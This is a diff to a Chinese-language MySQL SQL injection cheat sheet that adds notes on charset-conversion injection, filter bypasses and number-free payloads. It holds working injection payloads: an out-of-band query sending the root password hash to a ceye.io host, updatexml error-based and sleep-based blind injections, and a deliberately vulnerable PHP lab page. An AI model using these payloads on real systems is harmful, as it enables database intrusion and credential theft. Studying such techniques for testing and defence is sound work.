@@ -1630,7 +1630,34 @@ Time: 22.297s
 
 `SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM mysql.user WHERE user='root' LIMIT 1),'.mysql.ip.port.b182oj.ceye.io\\abc'));`
 
-### 宽字节注入
+### 字符集漏洞
+
+[Mysql-字符集漏洞分析](https://lalajun.github.io/2018/05/11/mysql-%E5%AD%97%E7%AC%A6%E9%9B%86%E6%BC%8F%E6%B4%9E/)
+
+在php中,常用以下语句来设置php客户端在Mysql中的字符集`set names utf8`
+
+这个语句会修改如下几项客户端设置
+
+```
+character_set_client=utf8
+character_set_connection=utf8
+character_set_results=utf8
+```
+
+然而如下服务端设置不会修改
+
+```
+character_set_database
+character_set_server
+character_set_filesysytem
+character_set_system
+```
+
+这样就造成了服务端与客户端的字符集不匹配,从而造成字符集转换漏洞
+
+当我们的mysql接受到客户端的数据后,会认为他的编码是`character_set_client`,然后会将之将换成`character_set_connection`的编码
+
+进入具体表和字段后,再转换成字段对应的编码,当查询结果产生后,会从表和字段的编码,转换成`character_set_results`编码,返回给客户端
 
 #### GBK编码注入
 
@@ -1859,7 +1886,54 @@ var_dump($result->fetch_all());
 
 [Mysql字符编码利用技巧](https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html)
 
->todo tofinish
+```
+version: '3.8'
+services:
+  mysql:
+    image: mysql:5.5.44
+    container_name: database
+    ports:
+      - "4000:3306"
+    environment:
+      MYSQL_ROOT_PASSWORD: root
+```
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203241612416.png)
+
+```php
+<?php
+highlight_file(__FILE__);
+$db = new mysqli("172.17.0.1", "root", "root", "test", "4000");
+if (mysqli_connect_errno()) { #检查连接
+    printf("Connect failed: %s\n", mysqli_connect_error());
+    exit();
+}
+$db->query("set names utf8");
+$username = addslashes($_GET['username']);
+if($username==='admin'){
+    die();
+}
+var_dump($username);
+$query = "select * from users where username = '$username';";
+$result = $db->query($query);
+var_dump($result->fetch_all());
+```
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203241651927.png)
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203241652096.png)
+
+>转换出错原因:latin1不支持汉字
+>
+>截断原因:mysql所使用的UTF-8编码是阉割版的,仅支持三个字节的编码,而对于不完整的长字节UTF-8编码的字符,若进行字符集转换时,会直接进行忽略处理
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203241700427.png)
+
+以下字符不允许出现
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203241701770.png)
+
+因此只有`[7F-C0]`中的部分字符可以被利用
 
 ### 约束攻击
 
@@ -2178,7 +2252,23 @@ Time: 0.008s
 
 ### and与or被过滤
 
-用`&&`和`||`代替
+- 用`&&`和`||`代替
+
+- 直接拼接数据
+
+```
+select id,username,password from users where id=1=1
+select id,username,password from users where id=1=0
+select id,username,password from users where id=1=updatexml(1,concat(0x7e,(select @@version),0x7e),1)
+
+select id,username,password from users where id=1^1
+select id,username,password from users where id=1^0
+select id,username,password from users where id=1^updatexml(1,concat(0x7e,(select @@version),0x7e),1)
+```
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203241440545.png)
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203241442340.png)
 
 ### 空格被过滤
 
@@ -2252,6 +2342,14 @@ for i in url_char:
 `select user,host from mysql.user where user='root'union(select{x(group_concat(schema_name))},{x(null)}from{x(information_schema.schemata)})#'`
 
 ![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202131742371.png)
+
+- 在特定情况下,偶数个`!`或`~`可以代替空格
+
+偶数个`!`进行多次逻辑非运算
+
+偶数个`~`进行多次取反运算(不变)
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203241431617.png)
 
 ### 逗号被过滤
 
@@ -2355,6 +2453,42 @@ mysql root@localhost:(none)> select user,host,file_priv from mysql.user where us
 +------+------+-----------+
 0 rows in set
 Time: 0.010s
+```
+
+### if被过滤
+
+使用`case when 条件 then 表达式1 else 表达式2 end`进行替换
+
+>记得在最后添加`end`
+
+[MySQL CASE Function](https://www.w3schools.com/sql/func_mysql_case.asp)
+
+```
+select id,username,password from users where username='asdf' and case when length(database())>5 then sleep(5) else 1 end
+select id,username,password from users where username='asdf' and case when length(database())<5 then sleep(5) else 1 end
+```
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203241505008.png)
+
+### 数字被过滤
+
+[MySQL注入技巧](https://wooyun.js.org/drops/MySQL%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7.html)
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203241515900.png)
+
+在利用`version()`时要注意版本号
+
+```
+false !pi()           0     ceil(pi()*pi())           10 A      ceil((pi()+pi())*pi()) 20       K
+true !!pi()           1     ceil(pi()*pi())+true      11 B      ceil(ceil(pi())*version()) 21   L
+true+true             2     ceil(pi()+pi()+version()) 12 C      ceil(pi()*ceil(pi()+pi())) 22   M
+floor(pi())           3     floor(pi()*pi()+pi())     13 D      ceil((pi()+ceil(pi()))*pi()) 23 N
+ceil(pi())            4     ceil(pi()*pi()+pi())      14 E      ceil(pi())*ceil(version()) 24   O
+floor(version())      5     ceil(pi()*pi()+version()) 15 F      floor(pi()*(version()+pi())) 25 P
+ceil(version())       6     floor(pi()*version())     16 G      floor(version()*version()) 26   Q
+ceil(pi()+pi())       7     ceil(pi()*version())      17 H      ceil(version()*version()) 27    R
+floor(version()+pi()) 8     ceil(pi()*version())+true 18 I      ceil(pi()*pi()*pi()-pi()) 28    S
+floor(pi()*pi())      9     floor((pi()+pi())*pi())   19 J      floor(pi()*pi()*floor(pi())) 29 T
 ```
 
 ### 比较操作符/函数
